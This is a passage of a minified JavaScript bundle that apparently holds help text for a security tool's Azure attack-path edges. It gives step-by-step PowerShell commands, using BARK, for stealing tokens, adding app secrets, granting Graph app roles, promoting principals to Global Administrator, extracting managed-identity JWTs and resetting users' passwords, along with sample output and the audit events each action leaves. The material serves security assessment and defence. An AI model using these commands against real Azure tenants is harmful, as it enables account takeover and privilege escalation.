what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:`$MGToken = Get-MSGraphTokenWithClientCredentials
    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c"
    -ClientSecret "asdf..."
    -TenantName "contoso.onmicrosoft.com"`}),e.jsx(t,{variant:"body2",children:"Then use BARK’s New-AppRegSecret to add a new secret to the target application:"}),e.jsx(t,{component:"pre",children:'New-AppRegSecret `\n    -AppRegObjectID "d878…" `\n    -Token $MGToken.access_token'}),e.jsx(t,{variant:"body2",children:"The output will contain the plain-text secret you just created for the target app:"}),e.jsx(t,{component:"pre",children:`New-AppRegSecret \`
-AppRegObjectID "d878…" \`
-Token $MGToken.access_token

Name                Value
-----------------------------
AppRegSecretValue   odg8Q~...
AppRegAppId         4d31…
AppRegObjectId      d878…`}),e.jsx(t,{variant:"body2",children:"With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:"}),e.jsx(t,{component:"pre",children:'$SPToken = Get-MSGraphToken `\n    -ClientID "4d31…" `\n    -ClientSecret "odg8Q~..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),cs=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has one of the following MS Graph app roles:"}),e.jsx(t,{variant:"body2",children:e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"Application.ReadWrite.All"})}),e.jsx(P,{children:e.jsx(M,{children:"RoleManagement.ReadWrite.Directory"})})]})}),e.jsx(t,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure App or Service Principal, you will not see that the Service Principal can add secrets to the object, but it indeed can because of the parallel access management system used by MS Graph."})]}),ls=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),ds=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),hs={general:cs,abuse:ss,opsec:ls,references:ds},ps=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),us=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ms=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),bs=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),fs={general:us,abuse:ps,opsec:ms,references:bs},ys=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),gs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),xs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),js=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),ws={general:gs,abuse:ys,opsec:xs,references:js},vs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),As=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Ss=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Cs=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),ks={general:As,abuse:vs,opsec:Ss,references:Cs},Ts=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Use BARK's Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:"}),e.jsx(t,{component:"pre",children:'"$SPs = Get-AllAzureADServicePrincipals `\n    -Token $MGToken"'}),e.jsx(t,{variant:"body2",children:"Next, find the MS Graph Service Principal's ID. You can do this by piping $SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:"}),e.jsx(t,{component:"pre",children:'$SPs | ?{$_.appId -Like "00000003-0000-0000-c000-000000000000"} | Select id'}),e.jsx(t,{variant:"body2",children:`The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the "ResourceID" argument for BARK's New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' is the universal ID for RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:`}),e.jsx(t,{component:"pre",children:`'New-AppRoleAssignment \`
    -SPObjectId "6b6f9289-fe92-4930-a331-9575e0a4c1d8" \`
    -AppRoleID "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" \`
    -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" \`
    -Token $MGToken'`}),e.jsx(t,{variant:"body2",children:"If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK's New-AzureADRoleAssignment."}),e.jsx(t,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),e.jsx(t,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),Ps=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against AzureAD tenant objects when a Service Principal has one of the following MS Graph app role assignments:"}),e.jsx(t,{variant:"body2",children:e.jsxs(B,{children:[e.jsx(P,{children:e.jsx(M,{children:"AppRoleAssignment.ReadWrite.All"})}),e.jsx(P,{children:e.jsx(M,{children:"RoleManagement.ReadWrite.Directory"})})]})})]}),Ds=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:'When you assign an app role to a Service Principal, the Azure Audit logs will create an event called "Add app role assignment to service principal". This event describes who made the change, what the target service principal was, and what app role assignment was granted.'})}),Os=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),Rs={general:Ps,abuse:Ts,opsec:Ds,references:Os},Es=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's New-AzureADRoleAssignment."}),e.jsx(t,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),e.jsx(t,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:"}),e.jsx(t,{component:"pre",children:'New-AzureADRoleAssignment `\n    -PrincipalID "6b6f9289-fe92-4930-a331-9575e0a4c1d8" `\n    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `\n    -Token $MGToken'}),e.jsx(t,{variant:"body2",children:"If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."})]}),Is=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created during post-processing. It is created against all AzureAD admin roles when a Service Principal has the following MS Graph app role assignment:"}),e.jsx(t,{variant:"body2",children:e.jsx(B,{children:e.jsx(P,{children:e.jsx(M,{children:"RoleManagement.ReadWrite.Directory"})})})}),e.jsx(t,{variant:"body2",children:"This privilege allows the Service Principal to promote itself or any other principal to any AzureAD admin role, including Global Administrator."})]}),$s=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:'When you assign an AzureAD admin role to a principal using this privilege, the Azure Audit log will create an event called "Add member to role outside of PIM (permanent)".'})}),Gs=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]}),Ns={general:Is,abuse:Es,opsec:$s,references:Gs},Ms=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Ls=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Fs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),_s=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),Us={general:Ls,abuse:Ms,opsec:Fs,references:_s},Ws=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Bs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),qs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Ks=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),zs={general:Bs,abuse:Ws,opsec:qs,references:Ks},Hs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Vs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Ys=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Qs=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),Js={general:Vs,abuse:Hs,opsec:Ys,references:Qs},Xs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),Zs=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),ec=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."})}),tc=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"})]}),rc={general:Zs,abuse:Xs,opsec:ec,references:tc},nc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal."}),e.jsx(t,{variant:"body2",children:"It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:"}),e.jsx(t,{component:"pre",children:`$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"
$tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
$tokenResponse.access_token`}),e.jsx(t,{variant:"body2",children:"We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."})]}),ac=()=>e.jsx(t,{variant:"body2",children:"Azure resources like Virtual Machines, Logic Apps, and Automation Accounts can be assigned to either System- or User-Assigned Managed Identities. This assignment allows the Azure resource to authenticate to Azure services as the Managed Identity without needing to know the credential for that Managed Identity. Managed Identities, whether System- or User-Assigned, are AzureAD Service Principals."}),oc=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),ic=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1078/",children:"https://attack.mitre.org/techniques/T1078/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines",children:"https://m365internals.com/2021/11/30/lateral-movement-with-managed-identities-of-azure-virtual-machines"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"https://github.com/BloodHoundAD/BARK"})]}),sc={general:ac,abuse:nc,opsec:oc,references:ic},cc=()=>e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),lc=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is a member of the group ",o,"."]}),e.jsx(t,{variant:"body2",children:"Groups in Azure Active Directory grant their direct members any privileges the group itself has. If a group has an AzureAD admin role, direct members of the group inherit those permissions."})]}),dc=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),hc=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/groups-create-eligible",children:"Create a role-assignable group in Azure Active Directory"})}),pc={general:lc,abuse:cc,opsec:dc,references:hc},uc=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emiting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."})}),mc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on."}),e.jsx(t,{variant:"body2",children:"The system-assigned identity for the AKS Cluster will have the Contributor role against the target Resource Group and its child Virtual Machine Scale Sets."})]}),bc=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),fc=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/",children:"Karl Fosaaen - How To Extract Credentials from Azure Kubernetes Service (AKS)"})]}),yc={general:mc,abuse:uc,opsec:bc,references:fc},gc=()=>e.jsx(t,{variant:"body2",children:"Everything a Contributor can do, with the addition of assigning rights to resources."}),xc=()=>e.jsx(t,{variant:"body2",children:"Object ownership means almost all abuses are possible against the target object."}),jc=()=>e.jsx(t,{variant:"body2",children:"This depends on which abuse you perform, but in general Azure will create a log for each abuse action."}),wc=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/",children:"https://blog.netspi.com/attacking-azure-with-custom-script-extensions/"})}),vc={general:xc,abuse:gc,opsec:jc,references:wc},Ac=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Set secret for Service Principal (AZAddSecret abuse info)"}),e.jsx(t,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),e.jsx(t,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),e.jsxs(t,{variant:"body2",children:["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",e.jsx(t,{component:"pre",children:'$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken "0.ARwA6WgJJ9X2qk…" -TenantID "contoso.onmicrosoft.com"'})]}),e.jsxs(t,{variant:"body2",children:["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",e.jsx(t,{component:"pre",children:'New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token'})]}),e.jsxs(t,{variant:"body2",children:["The output will contain the plain-text secret you just created for the target app:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID "d878…" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…'})]}),e.jsxs(t,{variant:"body2",children:["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",e.jsx(t,{component:"pre",children:'PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID "4d31…" `-ClientSecret "odg8Q~..." `-TenantName "contoso.onmicrosoft.com" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),e.jsx(t,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."}),e.jsx(t,{variant:"body1",children:"Reset password of user (AZResetPassword abuse info)"}),e.jsx(t,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),e.jsx(t,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),e.jsx(t,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),e.jsx(t,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),e.jsx(t,{variant:"body1",children:"Using an MS Graph-scoped token"}),e.jsx(t,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),e.jsx(t,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),e.jsx(t,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),e.jsx(t,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),e.jsxs(t,{variant:"body2",children:['If successful, the output will include a "204" status code:',e.jsx(t,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),e.jsx(t,{variant:"body1",children:"Using an Azure Portal-scoped token"}),e.jsx(t,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),e.jsx(t,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"If successful, the response will look like this:"}),e.jsx(t,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}'}),e.jsx(t,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),Sc=()=>e.jsx(t,{variant:"body2",children:"This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users. Privileged Authentication Administrator can set or reset any authentication method (including passwords) for any user, including Global Administrators."}),Cc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."}),e.jsx(t,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what 